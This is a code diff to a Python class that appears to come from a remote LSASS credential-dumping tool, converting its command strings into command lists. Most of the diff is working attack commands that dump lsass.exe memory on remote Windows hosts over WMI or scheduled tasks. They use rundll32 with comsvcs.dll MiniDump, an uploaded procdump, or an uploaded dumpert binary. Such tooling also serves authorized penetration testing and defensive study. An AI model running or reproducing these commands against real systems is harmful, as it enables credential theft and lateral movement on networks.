@@ -133,16 +133,23 @@ class Dumper:
 
     def dll_dump(self, exec_methods=("wmi", "task"), exec_shell="cmd"):
         if exec_shell == "cmd":
-            command = """cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ^%B {}{} full""".format(
-                self._tmp_dir, self._remote_lsass_dump
-            )
+            commands = [
+                """cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ^%B {}{} full""".format(
+                    self._tmp_dir, self._remote_lsass_dump
+                ),
+            ]
         elif exec_shell == "powershell":
-            command = 'powershell.exe -NoP -C "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {}{} full;Wait-Process -Id (Get-Process rundll32).id"'.format(
-                self._tmp_dir, self._remote_lsass_dump)
+            commands = [
+                'powershell.exe -NoP -C "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {}{} full;Wait-Process -Id (Get-Process rundll32).id"'.format(
+                    self._tmp_dir, self._remote_lsass_dump
+                ),
+            ]
         else:
             return RetCode(ERROR_UNDEFINED)
 
-        self._log.debug("Command : {}".format(command))
+        self._log.debug("Commands : ")
+        for command in commands:
+            self._log.debug("{}".format(command))
 
         exec_completed = False
 
@@ -150,7 +157,7 @@ class Dumper:
             for exec_method in exec_methods:
                 try:
                     self._log.debug("Trying exec method : \"{}\"".format(exec_method))
-                    self.exec_methods[exec_method](self._conn, self._log).execute(command)
+                    self.exec_methods[exec_method](self._conn, self._log).execute(commands)
                     self._log.debug("Exec method \"{}\" success !".format(exec_method))
                     return RetCode(ERROR_SUCCESS)
                 except Exception as e:
@@ -164,11 +171,11 @@ class Dumper:
         :param exec_methods: If set, it will use specified execution method. Default to WMI, then TASK
         """
         if not self._procdump_path:
-            self._log.warning("Procdump path has not been provided")
+            self._log.warn("Procdump path has not been provided")
             return RetCode(ERROR_PROCDUMP_NOT_PROVIDED)
         # Verify procdump exists on host
         if not os.path.exists(self._procdump_path):
-            self._log.warning("{} does not exist.".format(self._procdump_path))
+            self._log.warn("{} does not exist.".format(self._procdump_path))
             return RetCode(ERROR_PROCDUMP_NOT_FOUND)
 
         # Upload procdump
@@ -181,24 +188,30 @@ class Dumper:
         self.procdump = True
 
         # Dump lsass using PID
-        command = """cmd.exe /Q /c for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -r -ma %J {}{} & if NOT EXIST {}{} (echo FAILED > {}{})""".format(
-            self._tmp_dir, self._procdump,
-            self._tmp_dir, self._remote_lsass_dump,
-            self._tmp_dir, self._remote_lsass_dump,
-            self._tmp_dir, self._remote_lsass_dump
-        )
-        self._log.debug("Command : {}".format(command))
+        commands = [
+            """cmd.exe /Q /c for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma %J {}{}""".format(
+                self._tmp_dir, self._procdump,
+                self._tmp_dir, self._remote_lsass_dump
+            ),
+            "if NOT EXIST {}{} (echo FAILED > {}{})".format(
+                self._tmp_dir, self._remote_lsass_dump,
+                self._tmp_dir, self._remote_lsass_dump
+            )]
+
+        self._log.debug("Commands : ")
+        for command in commands:
+            self._log.debug("{}".format(command))
 
         exec_completed = False
         while not exec_completed:
             for exec_method in exec_methods:
                 try:
                     self._log.debug("Trying exec method : " + exec_method)
-                    self.exec_methods[exec_method](self._conn, self._log).execute(command)
+                    self.exec_methods[exec_method](self._conn, self._log).execute(commands)
                     self._log.debug("Exec method \"{}\" success !".format(exec_method))
                     return True
                 except Exception as e:
-                    self._log.warning("Exec method \"{}\" failed.".format(exec_method))
+                    self._log.warn("Exec method \"{}\" failed.".format(exec_method))
                     self._log.debug("Error : {}".format(str(e)))
             return RetCode(ERROR_WMI_NO_EXECUTE)
 
@@ -208,7 +221,7 @@ class Dumper:
         :param exec_methods: If set, it will use specified execution method. Default to WMI, then TASK
         """
         if not self._dumpert_path:
-            self._log.warning("dumpert path has not been provided")
+            self._log.warn("dumpert path has not been provided")
             return RetCode(ERROR_DUMPERT_NOT_PROVIDED)
 
         # Upload dumpert
@@ -221,22 +234,27 @@ class Dumper:
         self.dumpert = True
 
         # Dump lsass using PID
-        command = """cmd.exe /Q /c {}{} & for %A in ({}{}) do IF NOT EXIST %A ( echo FAILED > %A ) ELSE IF %~zA==0 ( echo FAILED > %A )""".format(
-            self._tmp_dir, self._dumpert,
-            self._tmp_dir, self._remote_lsass_dump
-        )
-        self._log.debug("Command : {}".format(command))
+        commands = [
+            """cmd.exe /Q /c {}{}""".format(
+                self._tmp_dir, self._dumpert
+            ),
+            "for %A in ({}{}) do IF NOT EXIST %A ( echo FAILED > %A ) ELSE IF %~zA==0 ( echo FAILED > %A )".format(
+                self._tmp_dir, self._remote_lsass_dump
+            )]
+
+        for command in commands:
+            self._log.debug("{}".format(command))
 
         exec_completed = False
         while not exec_completed:
             for exec_method in exec_methods:
                 try:
                     self._log.debug("Trying exec method : " + exec_method)
-                    self.exec_methods[exec_method](self._conn, self._log).execute(command)
+                    self.exec_methods[exec_method](self._conn, self._log).execute(commands)
                     self._log.debug("Exec method \"{}\" success !".format(exec_method))
                     return True
                 except Exception as e:
-                    self._log.warning("Exec method \"{}\" failed.".format(exec_method))
+                    self._log.warn("Exec method \"{}\" failed.".format(exec_method))
                     self._log.debug("Error : {}".format(str(e)))
             return RetCode(ERROR_WMI_NO_EXECUTE)
 
